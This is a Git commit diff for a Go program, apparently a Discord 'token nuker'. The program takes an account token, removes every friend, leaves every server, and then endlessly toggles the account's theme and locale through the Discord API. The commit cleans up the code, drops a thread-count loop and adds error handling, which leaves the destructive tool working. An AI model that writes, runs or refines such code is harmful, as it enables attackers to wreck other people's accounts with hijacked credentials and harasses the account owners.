a7fb2eaa1d4d78aa08bf95834a71e0054ed74a12
Azael <53409082+azael1337@users.noreply.github.com>
2020-08-16 15:58:20 +0200

    error fixed

--- main.go
+++ main.go
@@ -6,11 +6,11 @@ import (
     "bytes"
     "bufio"
     "strings"
-    "strconv"
     "net/http"
     "github.com/bwmarrin/discordgo"	
 )
 
+// Vars
 var (
     Session           *discordgo.Session 
 )
@@ -40,27 +40,25 @@ func getAllFriendsWorker(Session *discordgo.Session) []string {
     return friendIDS
 }
 
-func iterateSettingsWorker(Session *discordgo.Session, Threads int)  {
+func iterateSettingsWorker(Session *discordgo.Session)  {
     themes := []string{"light", "dark"}
     locales := []string{"ja", "zh-TW", "ko", "zh-CN"}
-    for i := 0; i < int(Threads); i++ {
-        for _, theme := range themes {
-            for _, locale := range locales {
-                var payload = []byte(fmt.Sprintf(`{"theme": "%v", "locale": "%v"}`, theme, locale))
-                req, err := http.NewRequest("PATCH", "https://discord.com/api/v6/users/@me/settings", bytes.NewBuffer(payload))
-                req.Header.Set("Authorization", Session.Token)
-                req.Header.Set("Content-Type", "application/json")
-            
-                if err != nil {
-                    fmt.Println("[\u001b[31m-\u001b[0m] := Error iterating user settings,", err)
-                }
-            
-                client := &http.Client{}
-                _, err = client.Do(req)
-            
-                if err != nil {
-                    fmt.Println("[\u001b[31m-\u001b[0m] := Error performing request,", err)
-                }
+    for _, theme := range themes {
+        for _, locale := range locales {
+            var payload = []byte(fmt.Sprintf(`{"theme": "%v", "locale": "%v"}`, theme, locale))
+            req, err := http.NewRequest("PATCH", "https://discord.com/api/v6/users/@me/settings", bytes.NewBuffer(payload))
+            req.Header.Set("Authorization", Session.Token)
+            req.Header.Set("Content-Type", "application/json")
+        
+            if err != nil {
+                fmt.Println("[\u001b[31m-\u001b[0m] := Error iterating user settings,", err)
+            }
+        
+            client := &http.Client{}
+            _, err = client.Do(req)
+        
+            if err != nil {
+                fmt.Println("[\u001b[31m-\u001b[0m] := Error performing request,", err)
             }
         }
     }
@@ -70,10 +68,6 @@ func main() {
     reader := bufio.NewReader(os.Stdin)
     fmt.Print("[\u001b[32m>\u001b[0m] Enter token : ")
     token, _ := reader.ReadString('\n')
-
-    fmt.Print("[\u001b[32m>\u001b[0m] Enter amount of threads : ")
-    threads, _ := reader.ReadString('\n')
-    threadsA, _ := strconv.Atoi(threads)
 
     Session, _ = discordgo.New(strings.TrimSpace(token))
     Session.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36"
@@ -88,25 +82,24 @@ func main() {
     guildsList := getAllGuildsWorker(Session)
 
     for _, friend := range friendList {
-        for i := 0; i < int(threadsA); i++ {
-            Session.RelationshipDelete(friend)
-            fmt.Println("[\u001b[32m+\u001b[0m] := Relationship removed : " + friend)
+        err := Session.RelationshipDelete(friend)
+        if err != nil {
+            fmt.Println(err)
         }
+        fmt.Println("[\u001b[32m+\u001b[0m] := Relationship removed : " + friend)
     }
 
     for _, guild := range guildsList {
-        for i := 0; i < int(threadsA); i++ {
-            err := Session.GuildLeave(guild)
-            if err != nil {
-                fmt.Println("[\u001b[31m-\u001b[0m] := Error leaving guild,", err)
-            } else {
-                fmt.Println("[\u001b[32m+\u001b[0m] := Guild left : " + guild)
-            }
+        err := Session.GuildLeave(guild)
+        if err != nil {
+            fmt.Println("[\u001b[31m-\u001b[0m] := Error leaving guild,", err)
+        } else {
+            fmt.Println("[\u001b[32m+\u001b[0m] := Guild left : " + guild)
         }
     }
 
     for (true) {
-        iterateSettingsWorker(Session, threadsA)
+        iterateSettingsWorker(Session)
     }
 
 }
